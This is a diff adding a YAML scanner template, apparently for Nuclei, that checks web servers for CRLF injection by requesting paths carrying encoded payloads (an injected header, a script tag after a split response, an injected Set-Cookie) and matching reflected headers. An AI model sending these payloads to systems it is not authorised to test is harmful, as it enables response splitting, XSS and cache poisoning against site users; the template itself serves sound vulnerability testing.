@@ -1,0 +1,30 @@
+id: gs-crlf-injection
+info:
+  name: CRLF Injection via Path
+  author: GhillieSuite-EX
+  severity: medium
+  description: |
+    The server reflects CRLF sequences in response headers,
+    enabling HTTP response splitting, XSS via injected headers,
+    and cache poisoning.
+  tags: crlf,injection,bb-custom
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0aX-Injected: GhillieSuite"
+      - "{{BaseURL}}/%0d%0a%0d%0a<script>alert(1)</script>"
+      - "{{BaseURL}}%0d%0aSet-Cookie:%20gsuite=injected"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-Injected: GhillieSuite"
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: gsuite=injected"
